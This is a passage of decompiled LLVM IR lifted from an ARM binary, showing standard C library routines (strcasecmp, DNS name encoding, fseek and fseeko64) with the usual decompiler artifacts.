  %v0_164f4 = phi i32 [ %v1_164f4, %dec_label_pc_164f4 ], [ %v0_164f413, %dec_label_pc_1646c ], [ %v1_16478, %dec_label_pc_164e0.backedge ]
  %v0_16500 = phi i32 [ %v1_16500, %dec_label_pc_164f4 ], [ %v0_164e09, %dec_label_pc_1646c ], [ %v1_16494, %dec_label_pc_164e0.backedge ]
  %v2_16500 = icmp eq i32 %v0_16500, 0
  br i1 %v2_16500, label %dec_label_pc_16508, label %dec_label_pc_164f4

dec_label_pc_16508:                               ; preds = %dec_label_pc_16500
  br label %dec_label_pc_1650c

dec_label_pc_1650c:                               ; preds = %dec_label_pc_1644c, %dec_label_pc_164d4, %dec_label_pc_164f4, %dec_label_pc_164cc, %dec_label_pc_16508
  %v1_16510 = phi i32 [ %v0_164cc, %dec_label_pc_164cc ], [ 0, %dec_label_pc_16508 ], [ %v1_164f4, %dec_label_pc_164f4 ], [ %v1_16478, %dec_label_pc_164d4 ], [ %v1_1644c, %dec_label_pc_1644c ]
  ret i32 %v1_16510

; uselistorder directives
  uselistorder i32 %v0_16500, { 1, 0 }
  uselistorder i32 %v1_16494, { 1, 0, 2 }
  uselistorder i32 %v1_16478, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1647839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1646c, { 1, 0 }
  uselistorder i32 %v0_164e09, { 1, 2, 0 }
  uselistorder i32 %v0_1644c, { 1, 0, 2 }
  uselistorder i32 %v2_16444, { 1, 0 }
  uselistorder i32 %v1_16440, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 2130640639, { 6, 2, 0, 7, 3, 1, 8, 4, 9, 5, 10 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1650c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_16500, { 2, 1, 0 }
  uselistorder label %dec_label_pc_164e0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_16478, { 1, 0 }
  uselistorder label %dec_label_pc_1646c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16464, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_16538

dec_label_pc_16538:                               ; preds = %dec_label_pc_16564, %entry
  %v1_1657c8 = phi i32 [ %v1_1657c9, %dec_label_pc_16564 ], [ 0, %entry ]
  %v0_1656c = phi i32 [ %v1_1656c, %dec_label_pc_16564 ], [ %arg2, %entry ]
  %v0_16570 = phi i32 [ %v1_16570, %dec_label_pc_16564 ], [ %tmp, %entry ]
  %v9_16538 = icmp eq i32 %v0_16570, %v0_1656c
  %.pre = inttoptr i32 %v0_16570 to i8*
  br i1 %v9_16538, label %dec_label_pc_16564, label %dec_label_pc_16540

dec_label_pc_16540:                               ; preds = %dec_label_pc_16538
  %v2_16540 = load i8, i8* %.pre, align 1
  %v3_16540 = zext i8 %v2_16540 to i32
  %v1_16544 = inttoptr i32 %v0_1656c to i8*
  %v2_16544 = load i8, i8* %v1_16544, align 1
  %v3_16544 = zext i8 %v2_16544 to i32
  %v4_16548 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 712) to i32*), align 4
  %v2_1654c = mul nuw nsw i32 %v3_16544, 2
  %v2_16550 = mul nuw nsw i32 %v3_16540, 2
  %v2_16554 = add i32 %v4_16548, %v2_1654c
  %v3_16554 = inttoptr i32 %v2_16554 to i16*
  %v4_16554 = load i16, i16* %v3_16554, align 2
  %v6_16554 = sext i16 %v4_16554 to i32
  %v2_16558 = add i32 %v4_16548, %v2_16550
  %v3_16558 = inttoptr i32 %v2_16558 to i16*
  %v4_16558 = load i16, i16* %v3_16558, align 2
  %v6_16558 = sext i16 %v4_16558 to i32
  %v2_1655c = sub nsw i32 %v6_16558, %v6_16554
  %v9_1655c = icmp eq i16 %v4_16558, %v4_16554
  br i1 %v9_1655c, label %dec_label_pc_16564, label %dec_label_pc_16578

dec_label_pc_16564:                               ; preds = %dec_label_pc_16538, %dec_label_pc_16540
  %v1_1657c9 = phi i32 [ %v2_1655c, %dec_label_pc_16540 ], [ %v1_1657c8, %dec_label_pc_16538 ]
  %v2_16564 = load i8, i8* %.pre, align 1
  %v2_16568 = icmp eq i8 %v2_16564, 0
  %v1_1656c = add i32 %v0_1656c, 1
  %v1_16570 = add i32 %v0_16570, 1
  store i32 %v1_16570, i32* @ip, align 4
  br i1 %v2_16568, label %dec_label_pc_16578, label %dec_label_pc_16538

dec_label_pc_16578:                               ; preds = %dec_label_pc_16564, %dec_label_pc_16540
  %v1_1657c = phi i32 [ %v1_1657c9, %dec_label_pc_16564 ], [ %v2_1655c, %dec_label_pc_16540 ]
  ret i32 %v1_1657c

; uselistorder directives
  uselistorder i32 %v1_16570, { 1, 0 }
  uselistorder i32 %v2_1655c, { 1, 0 }
  uselistorder i32 %v0_16570, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16564, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_16588 = load i32, i32* @r4, align 4
  store i32 %v3_16588, i32* %stack_var_-32, align 4
  %v6_16588 = load i32, i32* @r5, align 4
  %v9_16588 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_16590 = load i32, i32* @r1, align 4
  store i32 %v0_16590, i32* %r8.global-to-local, align 4
  %v0_16594 = load i32, i32* @r2, align 4
  store i32 %v0_16594, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_165fc23 = icmp slt i8* %arg1, null
  store i1 %v1_165fc23, i1* %cpsr_n.global-to-local, align 1
  %v2_165fc24 = icmp eq i8* %arg1, null
  store i1 %v2_165fc24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_165fc24, label %dec_label_pc_16614, label %dec_label_pc_16608

dec_label_pc_165a0:                               ; preds = %dec_label_pc_16608
  %v2_165a0 = call i32 @__GI_strchr(i32 %v0_165a026, i32 46)
  store i32 %v2_165a0, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_165a4 = icmp slt i32 %v2_165a0, 0
  store i1 %v1_165a4, i1* %cpsr_n.global-to-local, align 1
  %v2_165a4 = icmp eq i32 %v2_165a0, 0
  store i1 %v2_165a4, i1* %cpsr_z.global-to-local, align 1
  %v0_165a8 = load i32, i32* @r4, align 4
  %v2_165a8 = sub i32 %v2_165a0, %v0_165a8
  store i32 %v2_165a8, i32* @r5, align 4
  br i1 %v2_165a4, label %dec_label_pc_165b0, label %dec_label_pc_165bc

dec_label_pc_165b0:                               ; preds = %dec_label_pc_165a0
  %v1_165b0 = inttoptr i32 %v0_165a8 to i8*
  %v3_165b4 = call i32 @strlen(i8* %v1_165b0)
  %sext = mul i32 %v3_165b4, 16777216
  %v1_165b8 = sdiv i32 %sext, 16777216
  store i32 %v1_165b8, i32* @r5, align 4
  %v0_165c8.pre = load i32, i32* @r4, align 4
  %v0_165d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_165bc

dec_label_pc_165bc:                               ; preds = %dec_label_pc_165a0, %dec_label_pc_165b0
  %v0_165d8 = phi i32 [ %v2_165a0, %dec_label_pc_165a0 ], [ %v0_165d8.pre, %dec_label_pc_165b0 ]
  %v0_165c8 = phi i32 [ %v0_165a8, %dec_label_pc_165a0 ], [ %v0_165c8.pre, %dec_label_pc_165b0 ]
  %v0_165e8 = phi i32 [ %v2_165a8, %dec_label_pc_165a0 ], [ %v1_165b8, %dec_label_pc_165b0 ]
  %v0_165bc = load i32, i32* %sl.global-to-local, align 4
  %v1_165bc = add i32 %v0_165bc, 1
  store i32 %v1_165bc, i32* %r7.global-to-local, align 4
  %v1_165c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_165c0 = sub i32 %v1_165c0, %v0_165bc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_165c4 = icmp slt i32 %v0_165e8, 0
  store i1 %v1_165c4, i1* %cpsr_n.global-to-local, align 1
  %v2_165c4 = icmp eq i32 %v0_165e8, 0
  store i1 %v2_165c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_165c8, i32* @r1, align 4
  %v0_165cc = load i32, i32* %r8.global-to-local, align 4
  %v2_165cc = add i32 %v0_165cc, %v1_165bc
  store i32 %v2_165cc, i32* @r0, align 4
  store i32 %v0_165e8, i32* @r2, align 4
  %v1_165d4 = add i32 %v2_165c0, -1
  store i32 %v1_165d4, i32* @r3, align 4
  %v1_165d8 = add i32 %v0_165d8, 1
  store i32 %v1_165d8, i32* @r4, align 4
  br i1 %v2_165c4, label %dec_label_pc_16628, label %dec_label_pc_165e0

dec_label_pc_165e0:                               ; preds = %dec_label_pc_165bc
  %v2_165e0 = sub i32 %v0_165e8, %v1_165d4
  %v3_165e0 = icmp ult i32 %v0_165e8, %v1_165d4
  %v4_165e0 = xor i32 %v1_165d4, %v0_165e8
  %v5_165e0 = xor i32 %v2_165e0, %v0_165e8
  %v6_165e0 = and i32 %v5_165e0, %v4_165e0
  %v7_165e0 = icmp slt i32 %v6_165e0, 0
  store i1 %v7_165e0, i1* %cpsr_v.global-to-local, align 1
  %v8_165e0 = icmp slt i32 %v2_165e0, 0
  store i1 %v8_165e0, i1* %cpsr_n.global-to-local, align 1
  %v9_165e0 = icmp eq i32 %v0_165e8, %v1_165d4
  store i1 %v9_165e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_165e0, label %dec_label_pc_165e8, label %dec_label_pc_16628

dec_label_pc_165e8:                               ; preds = %dec_label_pc_165e0
  %v1_165e8 = trunc i32 %v0_165e8 to i8
  %v4_165e8 = add i32 %v0_165cc, %v0_165bc
  %v5_165e8 = inttoptr i32 %v4_165e8 to i8*
  store i8 %v1_165e8, i8* %v5_165e8, align 1
  %v0_165ec = call i32 @memcpy()
  store i32 %v0_165ec, i32* @r0, align 4
  %v0_165f0 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_165f0 = icmp slt i32 %v0_165f0, 0
  store i1 %v1_165f0, i1* %cpsr_n.global-to-local, align 1
  %v2_165f0 = icmp eq i32 %v0_165f0, 0
  store i1 %v2_165f0, i1* %cpsr_z.global-to-local, align 1
  %v0_165f4 = load i32, i32* @r5, align 4
  %v1_165f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_165f4 = add i32 %v1_165f4, %v0_165f4
  store i32 %v2_165f4, i32* %sl.global-to-local, align 4
  br i1 %v2_165f0, label %dec_label_pc_16614, label %dec_label_pc_165e8.dec_label_pc_165fc_crit_edge

dec_label_pc_165e8.dec_label_pc_165fc_crit_edge:  ; preds = %dec_label_pc_165e8
  %v0_165fc.pre = load i32, i32* @r4, align 4
  store i32 %v0_165fc.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_165fc = icmp slt i32 %v0_165fc.pre, 0
  store i1 %v1_165fc, i1* %cpsr_n.global-to-local, align 1
  %v2_165fc = icmp eq i32 %v0_165fc.pre, 0
  store i1 %v2_165fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_165fc, label %dec_label_pc_16614, label %dec_label_pc_16608

dec_label_pc_16608:                               ; preds = %entry, %dec_label_pc_165e8.dec_label_pc_165fc_crit_edge
  %v0_165a026 = phi i32 [ %v0_165fc.pre, %dec_label_pc_165e8.dec_label_pc_165fc_crit_edge ], [ %tmp, %entry ]
  %v5_1661c525 = phi i32 [ %v2_165f4, %dec_label_pc_165e8.dec_label_pc_165fc_crit_edge ], [ 0, %entry ]
  %v1_16608 = inttoptr i32 %v0_165a026 to i8*
  %v2_16608 = load i8, i8* %v1_16608, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1660c = icmp eq i8 %v2_16608, 0
  store i1 %v2_1660c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1660c, label %dec_label_pc_16614, label %dec_label_pc_165a0

dec_label_pc_16614:                               ; preds = %dec_label_pc_165e8.dec_label_pc_165fc_crit_edge, %dec_label_pc_165e8, %dec_label_pc_16608, %entry
  %v8_16620 = phi i32 [ 0, %entry ], [ %v5_1661c525, %dec_label_pc_16608 ], [ %v2_165f4, %dec_label_pc_165e8 ], [ %v2_165f4, %dec_label_pc_165e8.dec_label_pc_165fc_crit_edge ]
  %v0_16614 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16614 = icmp slt i32 %v0_16614, 0
  store i1 %v1_16614, i1* %cpsr_n.global-to-local, align 1
  %v2_16614 = icmp eq i32 %v0_16614, 0
  store i1 %v2_16614, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_16614, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_16614
  %v6_1661c = add i32 %v8_16620, 1
  store i32 %v6_1661c, i32* @r0, align 4
  %v7_16620 = load i32, i32* %r8.global-to-local, align 4
  %v9_16620 = add i32 %v7_16620, %v8_16620
  %v10_16620 = inttoptr i32 %v9_16620 to i8*
  store i8 0, i8* %v10_16620, align 1
  %v0_16624.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_16624.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16624.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_16614, %bb
  %v2_16624 = phi i1 [ %v2_16624.pre, %bb ], [ false, %dec_label_pc_16614 ]
  %v1_16624 = phi i1 [ %v1_16624.pre, %bb ], [ %v1_16614, %dec_label_pc_16614 ]
  %v0_16624 = phi i1 [ %v0_16624.pre, %bb ], [ %v2_16614, %dec_label_pc_16614 ]
  %v3_16624 = xor i1 %v2_16624, %v1_16624
  %v4_16624 = or i1 %v0_16624, %v3_16624
  br i1 %v4_16624, label %dec_label_pc_16628, label %.dec_label_pc_1662c_crit_edge

.dec_label_pc_1662c_crit_edge:                    ; preds = %bb22
  %v1_16630.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1662c

dec_label_pc_16628:                               ; preds = %dec_label_pc_165e0, %dec_label_pc_165bc, %bb22
  br label %dec_label_pc_1662c

dec_label_pc_1662c:                               ; preds = %.dec_label_pc_1662c_crit_edge, %dec_label_pc_16628
  %v1_16630 = phi i32 [ %v1_16630.pre, %.dec_label_pc_1662c_crit_edge ], [ -1, %dec_label_pc_16628 ]
  %v2_1662c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1662c, i32* @r4, align 4
  store i32 %v6_16588, i32* @r5, align 4
  store i32 %v9_16588, i32* @r6, align 4
  ret i32 %v1_16630

; uselistorder directives
  uselistorder i32 %v0_16614, { 0, 2, 1 }
  uselistorder i32 %v0_165fc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_165f0, { 1, 0 }
  uselistorder i32 %v2_165e0, { 1, 0 }
  uselistorder i32 %v1_165d4, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_165e8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_165b8, { 1, 0 }
  uselistorder i1 %v2_165fc24, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 (i8*)* @strlen, { 9, 7, 18, 17, 16, 19, 6, 5, 4, 3, 2, 1, 8, 15, 14, 13, 11, 12, 10, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 9, 5, 4, 3, 2, 1, 0, 8, 7, 6, 13, 12, 11, 10 }
  uselistorder label %dec_label_pc_1662c, { 1, 0 }
  uselistorder label %dec_label_pc_16628, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_16614, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16608, { 1, 0 }
  uselistorder label %dec_label_pc_165bc, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_16640 = load i32, i32* @r1, align 4
  store i32 %v0_16640, i32* @r2, align 4
  %v0_16648 = call i32 @__GI_fseeko64()
  ret i32 %v0_16648
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %v3_16658 = load i32, i32* @r4, align 4
  %v6_16658 = load i32, i32* @r5, align 4
  %v12_16658 = load i32, i32* @r7, align 4
  %v2_1665c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %tmp18, i32* %sl.global-to-local, align 4
  %v2_16664 = icmp ugt i32 %tmp18, 1
  store i1 %v2_16664, i1* %cpsr_c.global-to-local, align 1
  %v7_16664 = icmp eq i32 %tmp18, 2
  %v0_16668 = load i32, i32* @r0, align 4
  store i32 %v0_16668, i32* @r7, align 4
  %v2_1666c = xor i1 %v2_16664, true
  %v3_1666c = or i1 %v7_16664, %v2_1666c
  br i1 %v3_1666c, label %dec_label_pc_1668c, label %dec_label_pc_16670

dec_label_pc_16670:                               ; preds = %entry
  store i32 48240, i32* %r2.global-to-local, align 4
  %v0_16674 = call i32 @__aeabi_read_tp()
  %v3_16678 = load i16, i16* @global_var_222f0.75, align 2
  %v4_16678 = sext i16 %v3_16678 to i32
  store i32 %v4_16678, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v3_16684 = add i32 %v4_16678, %v0_16674
  %v4_16684 = inttoptr i32 %v3_16684 to i32*
  store i32 22, i32* %v4_16684, align 4
  br label %dec_label_pc_16804

dec_label_pc_1668c:                               ; preds = %entry
  %v1_1668c = add i32 %v0_16668, 52
  %v2_1668c = inttoptr i32 %v1_1668c to i32*
  %v3_1668c = load i32, i32* %v2_1668c, align 4
  store i32 %v3_1668c, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16690 = icmp eq i32 %v3_1668c, 0
  %v2_16694 = load i32, i32* @r2, align 4
  store i32 %v2_16694, i32* %stack_var_-40, align 4
  br i1 %v2_16690, label %dec_label_pc_1669c, label %dec_label_pc_16700

dec_label_pc_1669c:                               ; preds = %dec_label_pc_1668c
  %v0_1669c = call i32 @__aeabi_read_tp()
  %v0_166a0 = load i32, i32* @r7, align 4
  %v1_166a0 = add i32 %v0_166a0, 64
  %v2_166a0 = inttoptr i32 %v1_166a0 to i32*
  %v3_166a0 = load i32, i32* %v2_166a0, align 4
  store i32 %v3_166a0, i32* %r3.global-to-local, align 4
  %v1_166a4 = add i32 %v0_1669c, -1168
  store i32 %v1_166a4, i32* %r6.global-to-local, align 4
  %v3_166a8 = icmp uge i32 %v3_166a0, %v1_166a4
  store i1 %v3_166a8, i1* %cpsr_c.global-to-local, align 1
  %v9_166a8 = icmp eq i32 %v3_166a0, %v1_166a4
  br i1 %v9_166a8, label %dec_label_pc_166f4, label %dec_label_pc_166b0

dec_label_pc_166b0:                               ; preds = %dec_label_pc_1669c
  %v1_166b0 = add i32 %v0_166a0, 56
  store i32 %v1_166b0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_166b0, i32* %r2.global-to-local, align 4
  %v0_166bc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_166bc, i32* @r4, align 4
  %v1_166c037 = inttoptr i32 %v1_166b0 to i32*
  %v2_166c038 = load i32, i32* %v1_166c037, align 4
  store i32 %v2_166c038, i32* %r3.global-to-local, align 4
  %v3_166c440 = icmp uge i32 %v2_166c038, %v0_166bc
  store i1 %v3_166c440, i1* %cpsr_c.global-to-local, align 1
  %v9_166c446 = icmp eq i32 %v2_166c038, %v0_166bc
  br i1 %v9_166c446, label %dec_label_pc_166cc, label %dec_label_pc_166e4

dec_label_pc_166cc:                               ; preds = %dec_label_pc_166b0, %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_166dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_166dc, label %dec_label_pc_166e0, label %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge

dec_label_pc_166cc.dec_label_pc_166c0_crit_edge:  ; preds = %dec_label_pc_166cc
  %v0_166c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_166c4.pre = load i32, i32* @r4, align 4
  %v1_166c0 = inttoptr i32 %v0_166c0.pre to i32*
  %v2_166c0 = load i32, i32* %v1_166c0, align 4
  store i32 %v2_166c0, i32* %r3.global-to-local, align 4
  %v3_166c4 = icmp uge i32 %v2_166c0, %v1_166c4.pre
  store i1 %v3_166c4, i1* %cpsr_c.global-to-local, align 1
  %v9_166c4 = icmp eq i32 %v2_166c0, %v1_166c4.pre
  br i1 %v9_166c4, label %dec_label_pc_166cc, label %dec_label_pc_166e4

dec_label_pc_166e0:                               ; preds = %dec_label_pc_166cc
  %v0_166e0 = load i32, i32* @r4, align 4
  store i32 %v0_166e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166e4

dec_label_pc_166e4:                               ; preds = %dec_label_pc_166b0, %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge, %dec_label_pc_166e0
  %v0_166e4 = phi i32 [ %v0_166e0, %dec_label_pc_166e0 ], [ %v2_166c038, %dec_label_pc_166b0 ], [ %v2_166c0, %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_166e4 = icmp eq i32 %v0_166e4, 0
  br i1 %v2_166e4, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_166e4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_166e4, %bb
  store i32 91888, i32* @lr, align 4
  %v1_166ec = xor i1 %v2_166e4, true
  call void @__pseudo_cond_branch(i1 %v1_166ec, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_166f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_166f0 = load i32, i32* @r7, align 4
  %v2_166f0 = add i32 %v1_166f0, 64
  %v3_166f0 = inttoptr i32 %v2_166f0 to i32*
  store i32 %v0_166f0, i32* %v3_166f0, align 4
  %v0_166f4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_166f4

dec_label_pc_166f4:                               ; preds = %dec_label_pc_1669c, %bb21
  %v0_166f4 = phi i32 [ %v0_166a0, %dec_label_pc_1669c ], [ %v0_166f4.pre, %bb21 ]
  %v1_166f4 = add i32 %v0_166f4, 60
  %v2_166f4 = inttoptr i32 %v1_166f4 to i32*
  %v3_166f4 = load i32, i32* %v2_166f4, align 4
  %v1_166f8 = add i32 %v3_166f4, 1
  store i32 %v1_166f8, i32* %r3.global-to-local, align 4
  store i32 %v1_166f8, i32* %v2_166f4, align 4
  %v0_16700.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16700

dec_label_pc_16700:                               ; preds = %dec_label_pc_1668c, %dec_label_pc_166f4
  %v0_1670c = phi i32 [ %v0_16668, %dec_label_pc_1668c ], [ %v0_16700.pre, %dec_label_pc_166f4 ]
  %v1_16700 = inttoptr i32 %v0_1670c to i16*
  %v2_16700 = load i16, i16* %v1_16700, align 2
  %v3_16700 = zext i16 %v2_16700 to i32
  store i32 %v3_16700, i32* %r3.global-to-local, align 4
  %v1_16704 = and i32 %v3_16700, 64
  %v2_16704 = icmp eq i32 %v1_16704, 0
  br i1 %v2_16704, label %dec_label_pc_1671c, label %dec_label_pc_1670c

dec_label_pc_1670c:                               ; preds = %dec_label_pc_16700
  store i32 %v0_1670c, i32* @r0, align 4
  %v0_16710 = call i32 @__stdio_wcommit()
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16714 = icmp eq i32 %v0_16710, 0
  br i1 %v2_16714, label %dec_label_pc_1671c, label %dec_label_pc_16784

dec_label_pc_1671c:                               ; preds = %dec_label_pc_1670c, %dec_label_pc_16700
  %v0_1671c = load i32, i32* %sl.global-to-local, align 4
  %v2_1671c = icmp ne i32 %v0_1671c, 0
  store i1 %v2_1671c, i1* %cpsr_c.global-to-local, align 1
  %v7_1671c = icmp eq i32 %v0_1671c, 1
  br i1 %v7_1671c, label %dec_label_pc_16724, label %dec_label_pc_16738

dec_label_pc_16724:                               ; preds = %dec_label_pc_1671c
  %v0_16724 = load i32, i32* @r7, align 4
  store i32 %v2_1665c, i32* %r1.global-to-local, align 4
  %v2_1672c = inttoptr i32 %v0_16724 to i16*
  %v3_1672c = call i32 @__stdio_adjust_position(i16* %v2_1672c, i32 %v2_1665c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16730 = icmp slt i32 %v3_1672c, 0
  br i1 %v1_16730, label %dec_label_pc_16784, label %dec_label_pc_16724.dec_label_pc_16738_crit_edge

dec_label_pc_16724.dec_label_pc_16738_crit_edge:  ; preds = %dec_label_pc_16724
  %v0_16738.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16738

dec_label_pc_16738:                               ; preds = %dec_label_pc_16724.dec_label_pc_16738_crit_edge, %dec_label_pc_1671c
  %v0_16738 = phi i32 [ %v0_16738.pre, %dec_label_pc_16724.dec_label_pc_16738_crit_edge ], [ %v0_1671c, %dec_label_pc_1671c ]
  store i32 %v0_16738, i32* %r2.global-to-local, align 4
  %v0_1673c = load i32, i32* @r7, align 4
  store i32 %v2_1665c, i32* %r1.global-to-local, align 4
  %v4_16744 = call i32 @__stdio_seek(i32 %v0_1673c, i32* nonnull %stack_var_-40, i32 %v0_16738)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16748 = icmp slt i32 %v4_16744, 0
  br i1 %v1_16748, label %dec_label_pc_16784, label %dec_label_pc_16750

dec_label_pc_16750:                               ; preds = %dec_label_pc_16738
  %v0_16750 = load i32, i32* @r7, align 4
  %v1_16750 = inttoptr i32 %v0_16750 to i16*
  %v2_16750 = load i16, i16* %v1_16750, align 2
  %v3_16750 = zext i16 %v2_16750 to i32
  store i32 %v3_16750, i32* %r3.global-to-local, align 4
  %v1_16754 = add i32 %v0_16750, 8
  %v2_16754 = inttoptr i32 %v1_16754 to i32*
  %v3_16754 = load i32, i32* %v2_16754, align 4
  store i32 %v3_16754, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1675c = and i32 %v3_16750, 65464
  store i32 %v1_1675c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_16764 = trunc i32 %v1_1675c to i16
  store i16 %v1_16764, i16* %v1_16750, align 2
  %v0_16768 = load i32, i32* %r2.global-to-local, align 4
  %v1_16768 = load i32, i32* @r7, align 4
  %v2_16768 = add i32 %v1_16768, 28
  %v3_16768 = inttoptr i32 %v2_16768 to i32*
  store i32 %v0_16768, i32* %v3_16768, align 4
  %v0_1676c = load i32, i32* %r2.global-to-local, align 4
  %v1_1676c = load i32, i32* @r7, align 4
  %v2_1676c = add i32 %v1_1676c, 16
  %v3_1676c = inttoptr i32 %v2_1676c to i32*
  store i32 %v0_1676c, i32* %v3_1676c, align 4
  %v0_16770 = load i32, i32* %r2.global-to-local, align 4
  %v1_16770 = load i32, i32* @r7, align 4
  %v2_16770 = add i32 %v1_16770, 20
  %v3_16770 = inttoptr i32 %v2_16770 to i32*
  store i32 %v0_16770, i32* %v3_16770, align 4
  %v0_16774 = load i32, i32* %r2.global-to-local, align 4
  %v1_16774 = load i32, i32* @r7, align 4
  %v2_16774 = add i32 %v1_16774, 24
  %v3_16774 = inttoptr i32 %v2_16774 to i32*
  store i32 %v0_16774, i32* %v3_16774, align 4
  %v0_16778 = load i32, i32* %r1.global-to-local, align 4
  %v1_16778 = load i32, i32* @r7, align 4
  %v2_16778 = add i32 %v1_16778, 44
  %v3_16778 = inttoptr i32 %v2_16778 to i32*
  store i32 %v0_16778, i32* %v3_16778, align 4
  %v0_1677c = load i32, i32* %r1.global-to-local, align 4
  %v1_1677c = trunc i32 %v0_1677c to i8
  %v2_1677c = load i32, i32* @r7, align 4
  %v3_1677c = add i32 %v2_1677c, 2
  %v4_1677c = inttoptr i32 %v3_1677c to i8*
  store i8 %v1_1677c, i8* %v4_1677c, align 1
  br label %dec_label_pc_16788

